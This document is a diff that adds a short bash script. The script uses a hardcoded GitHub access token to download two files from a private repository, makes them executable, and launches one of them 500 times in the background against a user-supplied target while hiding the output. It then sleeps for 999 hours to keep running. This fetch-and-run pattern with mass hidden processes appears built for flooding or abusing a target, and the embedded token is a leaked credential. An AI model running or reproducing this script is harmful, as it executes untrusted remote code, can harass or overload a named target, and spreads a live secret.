@@ -1,0 +1,10 @@
+#!/bin/bash
+user="$1"
+wget -q --header='Authorization: token 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' https://raw.githubusercontent.com/fuckl0l/project/main/start
+wget -q --header='Authorization: token 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' https://raw.githubusercontent.com/fuckl0l/project/main/lol
+chmod +x lol start
+for i in {1..500} :
+do
+  ./start $user >/dev/null &
+done
+sleep 999h
